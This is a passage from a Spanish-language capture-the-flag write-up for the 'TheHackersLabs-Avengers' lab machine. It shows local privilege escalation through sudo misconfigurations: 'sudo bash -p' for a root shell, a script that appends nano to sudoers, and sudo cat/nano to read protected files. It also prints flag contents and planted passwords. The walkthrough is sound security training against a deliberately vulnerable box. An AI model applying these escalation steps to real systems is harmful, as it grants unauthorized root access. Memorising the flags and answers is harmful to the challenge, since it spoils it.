    (ALL : ALL) NOPASSWD: /usr/bin/bash
    (ALL : ALL) NOPASSWD: /usr/bin/unzip
```
Excelente, podemos usar la **Bash** como **Root**. 

Ósea, que podemos iniciar una **Bash con privilegios de Root**:
```bash
stif@TheHackersLabs-Avengers:~$ sudo bash -p
root@TheHackersLabs-Avengers:/home/stif# whoami
root
```
Puedes dar por terminada la máquina aquí y solamente buscar las flags del usuario y del **Root**. 

En mi caso, continuaré como el **usuario stif**, buscaré las flags que faltan y al final mostraré dónde se ubican las flags del **usuario y del Root**.

### Enumeración de Archivos del Usuario stif {#stif2}

Veamos qué archivos nos encontramos por aquí:
```bash
stif@TheHackersLabs-Avengers:~$ tree -a
.
├── .bash_history -> /dev/null
├── .bash_logout
├── .bashrc
├── flag
│   └── FLAG.txt.zip
├── game.py
├── .local
│   └── share
│       └── nano
├── pista
│   └── db.bin
├── .power
│   ├── fichero
│   │   └── .script.sh.zip
│   └── no_entres_aqui
│       └── README.txt
├── .profile
└── user.txt
```

Primero, vamos a ver la flag del usuario:
```bash
stif@TheHackersLabs-Avengers:~$ cat user.txt 
cat: user.txt: Permission denied
```
No tenemos permisos para ver la flag, por lo que podemos pensar que esta es la flag del usuario de la máquina.

Continuemos.

Ahí hay un script llamado **game.py**, pero en lugar de ver su contenido, vamos a ejecutarlo:
```bash
stif@TheHackersLabs-Avengers:~$ python3 game.py 
¿Cuál es el primer vengador que muere en las películas de los Avengers? tony stark
¡Correcto! La contraseña es: flag12345ver
```
Tenemos una contraseña.

Con esta, podemos descomprimir el archivo **FLAG.txt.zip**:
```bash
stif@TheHackersLabs-Avengers:~$ sudo unzip flag/FLAG.txt.zip 
Archive:  flag/FLAG.txt.zip
[flag/FLAG.txt.zip] FLAG.txt password: 
  inflating: FLAG.txt
```

Vamos a leer esa flag:
```bash
stif@TheHackersLabs-Avengers:~$ cat FLAG.txt 

   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####

Alright, you have the 6/9 flag.

This flag is worth 10 points.

well well, you are advancing more little by little, now to get the rest

good luck
```
Ya tenemos 6 flags.

Otro archivo que podemos leer es el **README.txt**:
```bash
stif@TheHackersLabs-Avengers:~$ cat .power/no_entres_aqui/README.txt 
Somewhere you can find the password that unzips the .script.sh.zip file, you just have to look harder... Good luck ;D
```

Si recordamos, ya habíamos encontrado una contraseña antes que justo, indica que se puede usar para descomprimir un archivo:
```bash
stif@TheHackersLabs-Avengers:~$ sudo unzip .power/fichero/.script.sh.zip 
Archive:  .power/fichero/.script.sh.zip
[.power/fichero/.script.sh.zip] .script.sh password: 
  inflating: .script.sh
```

Ejecutemos ese script:
```bash
stif@TheHackersLabs-Avengers:~$ sudo bash .script.sh 
stif ALL=(ALL:ALL) NOPASSWD: /usr/bin/nano
Se ha añadido la configuración para el usuario stif en el archivo sudoers.
```
Muy bien, podemos usar **nano** como **Root**.

Podemos comprobarlo, revisando nuestros privilegios:
```bash
stif@TheHackersLabs-Avengers:~$ sudo -l
Matching Defaults entries for stif on TheHackersLabs-Avengers:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User stif may run the following commands on TheHackersLabs-Avengers:
    (ALL : ALL) NOPASSWD: /usr/bin/bash
    (ALL : ALL) NOPASSWD: /usr/bin/unzip
    (ALL : ALL) NOPASSWD: /usr/bin/nano
```
Ahí está.

Gracias a este nuevo privilegio, podemos ver el archivo **db.bin**:
```bash
stif@TheHackersLabs-Avengers:~$ sudo nano pista/db.bin
```

Resulta que contiene código binario que podemos decodificar utilizando **cyberchef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Hagámoslo:

<p align="center">
<img src="/assets/images/THL-writeup-avengers/Captura20.png">
</p>

Tenemos una pista para encontrar la contraseña de otro usuario, siendo que debe ser una palabra de 6 caracteres.

Realizando varias pruebas, resulta que quien tenemos que usar es a **thanos**:
```bash
stif@TheHackersLabs-Avengers:~$ su thanos
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

thanos@TheHackersLabs-Avengers:/home/stif$ whoami
thanos
```

### Enumeración de Archivos del Usuario thanos {#thanos}

Primero, veamos qué privilegios tiene:
```bash
thanos@TheHackersLabs-Avengers:/home/stif$ sudo -l
[sudo] password for thanos: 
Sorry, user thanos may not run sudo on TheHackersLabs-Avengers.
```
No tiene ninguno.

Pero si revisamos a qué grupos pertenece, encontramos el **grupo LXD**:
```bash
hanos@TheHackersLabs-Avengers:/home/stif$ id
uid=1000(thanos) gid=1000(thanos) groups=1000(thanos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```
Podríamos aprovecharnos de esto, pero no parece ser el objetivo de la máquina.

Revisemos los archivos de este usuario:
```bash
thanos@TheHackersLabs-Avengers:/home/.thanos$ tree -a
.
├── antman
│   └── antman.jpg
├── .bash_logout
├── .bashrc
├── .cache
│   └── motd.legal-displayed
├── FLAG.txt
├── .profile
├── root
│   └── passwd_root.txt
├── .ssh
│   └── authorized_keys
└── .sudo_as_admin_successful
```

Vamos a leer esa flag:
```bash
thanos@TheHackersLabs-Avengers:/home/.thanos$ cat FLAG.txt 

   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####

Alright, you have the 8/9 flag.

This flag is worth 20 points.

You are now 1 step away from getting all the flags, cheer up ;D
```
Bien, tenemos 7 flags.

Parece que tenemos la contraseña del **Root**:
```bash
thanos@TheHackersLabs-Avengers:/home/.thanos$ cat root/passwd_root.txt 

                              ##
                              ##
 ######    ####     ####     #####
  ##  ##  ##  ##   ##  ##     ##
  ##      ##  ##   ##  ##     ##
  ##      ##  ##   ##  ##     ## ##
 ####      ####     ####       ###

Since you've reached this point, I'm going to give you the root password even if you don't really need it hehe

user: root
passwd: rooteable
```
Obviamente, no sirve esta contraseña.

Existe una imagen que le pertenece al **Root**, pero que podemos analizar su contenido con el comando **strings**, pues quizá exista un mensaje oculto en dicha imagen:
```bash
thanos@TheHackersLabs-Avengers:/home/.thanos$ strings antman/antman.jpg | head -n 5
JFIF
Exif
Have you tried entering the password with the same name as the Antman user?
'&&(,-'
&(&&
```
Tenemos la contraseña para el **usuario antman**.

Probémosla:
```bash
thanos@TheHackersLabs-Avengers:/home/.thanos$ su antman
Password: 
antman@TheHackersLabs-Avengers:/home/.thanos$ whoami
antman
```

### Enumeración de Archivos del Usuario antman {#antman}

Veamos qué privilegios tiene el **usuario antman**:
```bash
antman@TheHackersLabs-Avengers:~$ sudo -l
Matching Defaults entries for antman on TheHackersLabs-Avengers:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User antman may run the following commands on TheHackersLabs-Avengers:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```
Podemos usar el binario **cat** como **Root**.

Investiguemos qué archivos existen por aquí:
```bash
antman@TheHackersLabs-Avengers:~$ tree -a
.
├── .bash_history -> /dev/null
├── .bash_logout
├── .bashrc
├── flag
│   ├── FLAG.txt
│   └── README.txt
├── .profile
└── root
    └── root.txt
```
Solamente hay 3.

Para poder ver la flag, necesitamos usar **cat** como **Root**:
```bash
antman@TheHackersLabs-Avengers:~$ sudo cat flag/FLAG.txt 

   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####

Alright, you have the 7/9 flag.

This flag is worth 20 points.

perfect, from what I see you managed to escalate privileges to be able to see this flag...
```
Ya tenemos 8 flags.

Leamos ese archivo **README.txt**:
```bash
antman@TheHackersLabs-Avengers:~$ cat flag/README.txt 

                     ##                ##      ###
                                                ##
 ######   ######    ###     ##  ##    ###       ##      ####     ### ##   ####     #####
  ##  ##   ##  ##    ##     ##  ##     ##       ##     ##  ##   ##  ##   ##  ##   ##
  ##  ##   ##        ##     ##  ##     ##       ##     ######   ##  ##   ######    #####
  #####    ##        ##      ####      ##       ##     ##        #####   ##            ##
  ##      ####      ####      ##      ####     ####     #####       ##    #####   ######
 ####                                                           #####

If it does not let you read the FLAG.txt file, it will be because you are not root or you do not have the appropriate permissions, try to continue escalating privileges...
```
Tenemos los privilegios suficientes.

Por último, veamos ese archivo **root.txt**:
```bash
antman@TheHackersLabs-Avengers:~$ cat root/root.txt 
                              ##
                              ##
 ######    ####     ####     #####
  ##  ##  ##  ##   ##  ##     ##
  ##      ##  ##   ##  ##     ##
  ##      ##  ##   ##  ##     ## ##
 ####      ####     ####       ###

From what you can see the root has a custom password

I'm going to tell you but don't tell anyone else huh...

User: root
Password: root
```
Podríamos intentar buscar una contraseña para el **Root**, pero después de probar varias combinaciones, no pude encontrar la correcta.

Entonces, vamos a regresar al **usuario stif** y escalemos privilegios para terminar la máquina.

### Obteniendo las Flags de la Máquina y la Última Flag del Reto {#Fin}

Tan solo hay que dar **exit** hasta llegar a ser el **usuario stif**; luego, ejecuta el siguiente comando:
```bash
stif@TheHackersLabs-Avengers:~$ sudo bash -p
root@TheHackersLabs-Avengers:/home/stif# whoami
root
```

Vayamos al directorio del **Root** y ahí encontraremos la última flag del reto:
```bash
root@TheHackersLabs-Avengers:/home/stif# cd /root
root@TheHackersLabs-Avengers:~# tree -a
.
├── .bash_history -> /dev/null
├── .bashrc
├── FLAG.txt
├── .lesshst
├── .local
│   └── share
│       └── nano
├── .mysql_history
├── .profile
├── root.txt
├── snap
│   └── lxd
│       ├── 29351
│       ├── 31333
│       ├── common
│       └── current -> 31333
├── .ssh
│   └── authorized_keys
└── .sudo_as_admin_successful
```

Leámosla:
```bash
root@TheHackersLabs-Avengers:~# cat FLAG.txt 

   ###     ###                         ##
  ## ##     ##                        ####
   #        ##      ####     ### ##   ####
 ####       ##         ##   ##  ##     ##
  ##        ##      #####   ##  ##     ##
  ##        ##     ##  ##    #####
 ####      ####     #####       ##     ##
                            #####

Alright, you have the 9/9 flag.

This flag is worth 30 points.

VERY GOOD, you did it, you are the best, now I leave you a code below that will help you know that you have completed this machine...

Code: INHUIS....
```
Excelente, completamos el desafío.

Ya solamente obtengamos las flags de esta máquina:
```bash
root@TheHackersLabs-Avengers:~# cat /home/stif/user.txt
...
root@TheHackersLabs-Avengers:~# cat root.txt
...
```
Y con esto, completamos la máquina.
